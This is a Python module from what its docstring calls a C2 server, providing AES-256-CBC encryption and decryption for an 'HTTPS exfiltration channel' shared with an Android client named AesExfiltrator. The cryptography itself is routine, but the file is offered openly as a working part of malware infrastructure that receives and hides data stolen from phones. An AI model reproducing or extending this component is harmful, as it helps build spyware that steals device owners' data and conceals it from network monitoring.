"""
Application-level AES-256-CBC encryption for the HTTPS exfiltration channel.

The AES key is shared between this server and the Android client
(AesExfiltrator.kt, key constant in C2NetworkModule.kt).

Wire format: Base64( IV[16 bytes] || AES-CBC-ciphertext )
"""

import base64
import logging
import os

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.padding import PKCS7

from config import AES_SECRET_KEY

logger = logging.getLogger("c2-server.crypto")

_KEY_BYTES = AES_SECRET_KEY.encode("utf-8")  # must be exactly 32 bytes
_BLOCK_BITS = 128  # AES block size in bits


def decrypt(ciphertext_b64: str) -> str:
    """Decrypt a base64-encoded AES-CBC payload. IV is the first 16 bytes."""
    raw = base64.b64decode(ciphertext_b64)
    iv = raw[:16]
    ciphertext = raw[16:]
    cipher = Cipher(algorithms.AES(_KEY_BYTES), modes.CBC(iv))
    decryptor = cipher.decryptor()
    padded = decryptor.update(ciphertext) + decryptor.finalize()
    unpadder = PKCS7(_BLOCK_BITS).unpadder()
    plaintext = unpadder.update(padded) + unpadder.finalize()
    return plaintext.decode("utf-8")


def encrypt(plaintext: str) -> str:
    """Encrypt a string with AES-256-CBC. Returns base64( IV || ciphertext )."""
    iv = os.urandom(16)
    padder = PKCS7(_BLOCK_BITS).padder()
    padded = padder.update(plaintext.encode("utf-8")) + padder.finalize()
    cipher = Cipher(algorithms.AES(_KEY_BYTES), modes.CBC(iv))
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(padded) + encryptor.finalize()
    return base64.b64encode(iv + ciphertext).decode("ascii")
